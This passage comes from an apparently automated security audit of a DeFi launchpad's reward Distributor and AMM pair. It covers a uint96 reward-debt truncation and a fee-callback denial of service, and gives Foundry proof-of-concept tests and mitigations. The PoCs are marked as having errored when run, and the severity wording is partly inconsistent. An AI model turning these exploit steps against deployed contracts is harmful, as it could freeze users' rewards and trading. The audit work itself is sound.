3) As launchpad, give the test user 1 share via increaseStake so totalShares = 1.
4) Let PRECISION = 1e12. Choose safeChunk = floor(type(uint128).max / PRECISION) - 1 to avoid overflow in (pending * PRECISION).
5) Compute n = floor(type(uint96).max / safeChunk) + 1, so that n * safeChunk > 2**96 - 1.
6) Mint total = n * safeChunk base tokens to the test contract and approve Distributor.
7) Loop n times: addRewards(base, quote, safeChunk, 0), then vm.prank(user) claimRewards(base). Each iteration flushes pending and updates accBaseRewardPerShare safely.
8) After the nth claim, user.baseRewardDebt is set to uint96(totalAccRewards) and truncates because totalAccRewards > 2**96 - 1.
9) Now, immediately attempt another claim (with zero pending). Pending is computed as (totalAccRewards - truncatedDebt) which is huge, and _decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards. This demonstrates the permanent bricking of subsequent claims.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {UserRewardData} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract RewardsOverflowTest is Test {
    Distributor distributor;
    MockERC20 base;
    address launchAsset;
    address quoteAsset;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // make this contract the launchpad

        base = new MockERC20();
        launchAsset = address(base);
        quoteAsset = address(0x1234);

        distributor.createRewardsPair(launchAsset, quoteAsset);
        distributor.increaseStake(launchAsset, user, 1); // totalShares = 1, user has 1 share
    }

    function testDebtTruncationBricksClaims() public {
        uint128 PRECISION = 1e12;
        // strictly below the overflow threshold for (pending * PRECISION)
        uint128 safeChunk = uint128(type(uint128).max / PRECISION) - 1;
        uint256 n = (uint256(type(uint96).max) / uint256(safeChunk)) + 1; // ensure cumulative > 2**96 - 1
        uint256 total = uint256(safeChunk) * n;

        base.mint(address(this), total);
        base.approve(address(distributor), total);

        // Stream rewards in safe chunks, flushing with a claim each time
        for (uint256 i = 0; i < n; i++) {
            distributor.addRewards(launchAsset, quoteAsset, safeChunk, 0);
            vm.prank(user);
            distributor.claimRewards(launchAsset);
        }

        // Confirm stored debt is below total due to truncation to uint96
        UserRewardData memory data = distributor.getUserData(launchAsset, user);
        assertLt(uint256(data.baseRewardDebt), total);

        // Next claim (with zero pending) computes an inflated pending and reverts
        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(launchAsset);
    }
}

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function totalSupply() external view returns (uint256) { return 0; }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - value;
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    function mint(address to, uint256 value) external {
        balanceOf[to] += value;
    }
}


## Suggested Mitigation
Eliminate the narrowing cast of per-user reward debt:
- Change UserRewardData.baseRewardDebt and quoteRewardDebt to uint256, and propagate the type through stake/unstake/claim/getPendingRewards so all arithmetic stays in 256-bit. This fully prevents truncation even for extremely large cumulative rewards.
- Additionally, fix intermediate math width to avoid inadvertent overflows in getAccRewardsPerShare by casting at least one operand to uint256 before multiplication:
  accBaseRewardsPerShare += (uint256(self.pendingBaseRewards) * PRECISION_FACTOR) / uint128(totalShares);
  accQuoteRewardsPerShare += (uint256(self.pendingQuoteRewards) * PRECISION_FACTOR) / uint128(totalShares);
- If storage cost is paramount, alternatively keep debts as uint128 (not uint96) and add explicit bounds checks before casting:
  uint256 total = totalAccRewards(...);
  if (total > type(uint128).max) revert RewardDebtOverflow();
  userData.baseRewardDebt = uint128(total);
- As a defense-in-depth measure, consider bounding per-update pending additions to ensure (pending * PRECISION_FACTOR) does not overflow the chosen intermediate type, or enforce this bound in addRewards with a clear error.





 **Derived From** : Reward accounting uses unsafe uint256→uint96 downcasts which can overflow and corrupt debts

## [M-14]. Overflow of 96-bit reward debts can brick Distributor reward pool after extremely large emissions

### Finding Severity Justification: RewardsTrackerLib stores per-user reward debts as uint96 while the accumulator and computed totals are uint256. When lifetime accrued rewards per user exceed 2^96-1, the downcast silently truncates, breaking the accounting invariant and causing subsequent claims to compute an exaggerated owed amount that exceeds Distributor.totalPendingRewards, reverting and permanently DoSing that user's future claims (and potentially their unstake). Impact is loss of matured yield/claim availability for affected users, but likelihood is low because it requires extremely large cumulative emissions. The issue does not brick the entire pool, only the overflowed accounts.
## Derived From Pattern/Invariant
Reward accounting uses unsafe uint256→uint96 downcasts which can overflow and corrupt debts

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.claim

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad Distributor uses RewardsTrackerLib to track pro‑rata rewards with per-user debts stored as uint96, but all reward-per-share math is done in uint256 and then blindly downcast to uint96 without bounds checks. Once a user’s accumulated rewards exceed 2^96-1, the stored debt silently wraps, breaking the core accounting invariant and causing future claims to over-estimate owed rewards.

Key code (RewardsTrackerLib):

```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare)
    internal
    pure
    returns (uint256)
{
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function stake(RewardPoolData storage self, address user, uint96 newShares) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint96(userData.shares);
    ...
    userData.baseRewardDebt = uint96(
        totalAccRewards(existingShares + newShares, accBaseRewardsPerShare)
    );
    userData.quoteRewardDebt = uint96(
        totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare)
    );
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    UserRewardData storage userData = self.userRewards[user];
    uint256 shares = uint256(userData.shares);
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```

Because `totalAccRewards` is uint256 and can grow without any explicit cap (pending rewards are uint128, `acc*RewardPerShare` is uint256), casting to `uint96` silently truncates the upper 160 bits once the true accumulated rewards exceed ~7.9e28. The first claim that crosses this threshold still pays out the correct amount (since the previous debt was below 2^96), but stores a wrapped debt.

On any subsequent reward addition and claim, `baseAmount` is computed as `totalAccBaseRewards - baseRewardDebt`, where `baseRewardDebt` is now much smaller than the true lifetime rewards. This produces a huge `baseAmount` (roughly the previous accumulated rewards modulo 2^96 plus the new increment). `_decreaseTotalPending` in Distributor then sees that `totalPendingRewards[asset] < baseAmount` and reverts with `ClaimAmountExceedsTotalPendingRewards()`, bricking all future claims for that pool until someone manually injects an enormous amount of extra rewards. The same pattern applies to `stake` / `unstake` which also update debts with `uint96(...)` casts.

This is an ERC4626-style share accounting invariant break: the index (`acc*RewardPerShare`) is tracked in full precision, but the per-user debt is truncated, so `Σ(userDebt) + pending` no longer matches the true accumulated rewards. Once triggered, normal user actions (claiming small new rewards) will revert and rewards become unclaimable.

## Impact
If a user’s lifetime accumulated rewards exceed 2^96-1, their stored reward debt wraps due to the uint256→uint96 downcast. On the next interaction (claim/stake/unstake), the owed amount is computed as k*2^96 + delta, which far exceeds Distributor.totalPendingRewards and causes a revert in _decreaseTotalPending. This permanently DoSes reward claims for the affected account (and can also block launchpad-triggered stake/unstake for that account) unless an astronomically large top-up is provided or the contract is patched. Other users and the pool continue to function unless they also overflow.

## Command to Run Test


## Proof of Concept
1. A rewards pool is created for some launch asset, and at least one user has non-zero shares.
2. An attacker (or well-meaning liquidity mining campaign) calls Distributor.addRewards with a very large amount of base rewards such that for at least one staker, totalAccRewards(shares, accBaseRewardPerShare) > 2**96-1. This is possible because addRewards is permissionless and accepts amounts up to uint128, and total emitted rewards over the lifetime of the pool are unbounded.
3. That staker calls Distributor.claimRewards(launchAsset) for the first time after the large emission. The claim succeeds and pays out the correct large reward, but sets userData.baseRewardDebt = uint96(totalAccBaseRewards), silently truncating the debt modulo 2**96.
4. Later, any small additional reward (e.g. 1 token) is added via addRewards.
5. When the same user (or any other whose debt has wrapped) calls claimRewards again, claim() computes baseAmount = totalAccBaseRewards - baseRewardDebt ≈ previousAccRewards + tinyIncrement - (previousAccRewards mod 2**96) ≈ k * 2**96 + tinyIncrement. `_decreaseTotalPending` compares this against totalPendingRewards[asset], which only contains the small new emission (e.g. 1), and reverts with ClaimAmountExceedsTotalPendingRewards.
6. Because the revert happens after RewardsTrackerLib.update() has applied the new pendingBaseRewards into the accumulator, the entire transaction reverts and the rewards state (including the wrapped debt) stays as before. Any attempt to claim after any new reward emission will repeat the same revert, effectively freezing claims for the pool.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract RewardsTrackerOverflowTest is Test {
    Distributor distributor;
    MockERC20 rewardToken;

    address launchAsset;
    address quoteAsset = address(0xBEEF);
    address user = address(0x1234);
    address attacker = address(0xBEEF);

    function setUp() public {
        rewardToken = new MockERC20();
        launchAsset = address(rewardToken);

        // Deploy Distributor and set this test as owner & launchpad.
        distributor = new Distributor();
        distributor.initialize(address(this));

        // Create rewards pool for (launchAsset, quoteAsset). totalShares starts at 0.
        distributor.createRewardsPair(launchAsset, quoteAsset);

        // Give the user some shares in the pool via the launchpad-only hook.
        distributor.increaseStake(launchAsset, user, 1);
    }

    function testRewardDebtOverflowCausesClaimDos() public {
        // Big reward of 2^96 base tokens, fits in uint128 but not uint96.
        uint128 bigAmount = uint128(1) << 96;
        uint128 smallAmount = 1;

        // Mint rewards to attacker and approve Distributor.
        rewardToken.mint(attacker, uint256(bigAmount) + smallAmount);
        vm.startPrank(attacker);
        rewardToken.approve(address(distributor), uint256(bigAmount) + smallAmount);

        // 1) Add a huge reward so that totalAccRewards > 2^96 for the staker.
        distributor.addRewards(launchAsset, quoteAsset, bigAmount, 0);
        vm.stopPrank();

        // 2) First claim: succeeds and pays bigAmount, but baseRewardDebt wraps to 0.
        vm.prank(user);
        distributor.claimRewards(launchAsset);

        // 3) Add a tiny extra reward.
        vm.prank(attacker);
        distributor.addRewards(launchAsset, quoteAsset, smallAmount, 0);

        // 4) Second claim tries to claim ~2^96 + 1 tokens while only 1 is pending.
        // This triggers ClaimAmountExceedsTotalPendingRewards and bricks the pool.
        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(launchAsset);
    }
}

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}


## Suggested Mitigation
Avoid truncating accumulated rewards into 96 bits. Prefer storing reward debts as uint256 to match the accumulator and remove all downcasts: in UserRewardData, change baseRewardDebt/quoteRewardDebt to uint256; set debts directly without casting; and in claim/getPendingRewards remove the uint128(...) casts in the subtractions so types are consistent. If storage packing is critical, add explicit range checks before any downcast and revert (e.g., RewardDebtOverflow) instead of silently wrapping. Additionally, consider bounding total emissions or acc*RewardPerShare so exceeding the chosen bit width is provably impossible over the pool’s lifetime.





 **Derived From** : Launchpad fee distribution callback can revert and DoS Uniswap pair swaps when no rewards shares

## [M-15]. Distributor.addRewards revert when no staking shares bricks GTELaunchpadV2Pair swaps

### Finding Severity Justification: A revert in the external rewards callback inside the AMM pair’s core _update() path can DoS swap(), sync(), and potentially burn() when accrued fees exist. This disables trading and may temporarily prevent LP withdrawals, impacting protocol availability but not directly stealing funds. This aligns with Code4rena Medium: protocol function/availability impacted without direct asset theft.
## Derived From Pattern/Invariant
Launchpad fee distribution callback can revert and DoS Uniswap pair swaps when no rewards shares

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The code path and revert conditions are clear and reproducible. However, the exact lifecycle and timing of when rewards are ended by the launchpad (which could avoid this state in practice) is not fully guaranteed from the provided snippets. Thus, while the vulnerability stands in code, its frequency in production depends on operational sequencing, warranting some caution.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair forwards a share of each swap's fees to the external Distributor via _distributeLaunchpadFees, which calls IDistributor.addRewards. If the corresponding rewards pool has zero totalShares or has not been created, Distributor.addRewards reverts with NoSharesToIncentivize() or RewardsDoNotExist(). Because this external call is made inside the core _update() path used by swap() and sync(), any revert from addRewards bubbles up and reverts the entire swap/sync.

Relevant code in GTELaunchpadV2Pair:

- In swap():

    (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
        && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

    _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);

- In _update():

    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    }

- In _distributeLaunchpadFees():

    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        emit LaunchpadFeesCollected(fee0, fee1);
    }

Distributor.addRewards() reverts for a realistic internal state:

    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
            (token0, token1, amount0, amount1);
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

        if (rs.quoteAsset == address(0)) {
            rs = RewardsTrackerStorage.getRewardPool(token1);
            if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
            (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
        }

        if (rs.totalShares == 0) revert NoSharesToIncentivize();
        ...
    }

Scenarios that trigger a permanent DoS on the pair until admin/manual intervention:

1. **Zero-share pool**: After the rewards pool is created and trading has begun, all stakers eventually exit so rs.totalShares == 0, but launchpad has not yet called Distributor.endRewards() / pair.endRewardsAccrual(). rewardsPoolActive in the pair remains > 0. The next swap that generates non-zero launchpadFee0/1 calls _distributeLaunchpadFees → Distributor.addRewards → NoSharesToIncentivize(), reverting the swap. From this point, every swap (and sync that accumulates new fees) will revert until rewards are explicitly ended.

2. **Misconfigured / missing rewards pool**: If launchpadFeeDistributor is set to a Distributor that does not have a reward pool for either token0 or token1 (no createRewardsPair call), addRewards reverts with RewardsDoNotExist(), again bricking any swap that attempts to forward fees.

In both cases, no privileged call is required to trigger the failing path: any user trying to swap on the AMM will hit the revert, and there is no way for them to bypass the fee callback.

## Impact
Because the external Distributor.addRewards() call is made inside the pair’s _update() when timeElapsed > 0, any revert from addRewards (e.g., NoSharesToIncentivize or RewardsDoNotExist) will revert swap(), sync(), and burn() on the first call in each new block. Since the revert occurs before blockTimestampLast updates, every subsequent attempt in that block and future blocks will also hit the same failing path, effectively bricking the pair. If accruedLaunchpadFee{0,1} > 0 from a prior tx, burn() and sync() will also revert due to forced distribution attempts, preventing LPs from withdrawing until admin intervention.

## Command to Run Test


## Proof of Concept
1) Deploy Distributor and initialize with launchpad = deployer.
2) From launchpad, call distributor.createRewardsPair(token0, token1) so the pool exists but has totalShares == 0.
3) Deploy GTELaunchpadV2Pair; initialize with token0, token1, launchpadLp = deployer, launchpadFeeDistributor = distributor.
4) Seed liquidity: transfer token0/token1 to the pair and call mint().
5) Advance time so timeElapsed > 0 on the next _update() (e.g., warp block.timestamp + 1).
6) A trader transfers token0 into the pair (amount0In > 0), then calls swap(0, smallAmount1Out, trader, "").
7) swap() computes non-zero launchpad fees, _update() runs with timeElapsed > 0, calls _distributeLaunchpadFees(), which calls distributor.addRewards().
8) addRewards() finds rs.totalShares == 0 and reverts with NoSharesToIncentivize(), bubbling up and reverting swap().
9) Subsequent swaps/syncs/burns will also revert, DoS-ing the pair until endRewardsAccrual() is called.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LaunchpadFeeDoSTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    address trader = address(0x1234);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set launchpad

        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        // Create rewards pool; keep totalShares == 0
        distributor.createRewardsPair(address(token0), address(token1));

        // Deploy pair; this contract is factory
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        // Add initial liquidity
        token0.mint(address(this), 1_000 ether);
        token1.mint(address(this), 1_000 ether);
        token0.transfer(address(pair), 1_000 ether);
        token1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));

        // Fund trader with input token
        token0.mint(trader, 10 ether);
    }

    function testSwapRevertsWhenNoShares_TimeElapsedGate() public {
        // Ensure timeElapsed > 0 so _update() will attempt distribution this call
        vm.warp(block.timestamp + 1);

        vm.startPrank(trader);
        // Prefund pair so amount0In > 0
        token0.transfer(address(pair), 1 ether);

        // Request a conservative output amount to avoid K reverts (well within reserves)
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 0.1 ether, trader, "");
        vm.stopPrank();
    }
}


## Suggested Mitigation
Make the AMM core resilient to reward-module failures so swaps/sync/burn cannot be bricked:
- In GTELaunchpadV2Pair._distributeLaunchpadFees(), wrap the external call in try/catch. On success, proceed as today. On failure, re-credit the attempted amounts back into accruedLaunchpadFee0/1 so they remain excluded from reserves and are not skimmable. Example logic: delete accrued only after a successful call, or if deleted before call, then in catch set accruedLaunchpadFee0/1 += attempted fees and emit LaunchpadFeesAccrued.
- Alternatively (or additionally), make Distributor.addRewards non-reverting for expected states: if rs.totalShares == 0 or the pool is not initialized, either (a) create the pool on the fly if allowed, or (b) just accumulate amounts into pendingBaseRewards/pendingQuoteRewards without updating per-share; the existing RewardsTracker logic naturally defers distribution until shares > 0.
- Optionally add a cheap view gate: expose Distributor.poolExists(token) and poolHasShares(token) and have the pair skip addRewards if the pool is missing or has zero shares.

Any of these ensures launchpad fee forwarding cannot DoS the pair, while preserving accounting invariants and preventing skimmable leftovers.



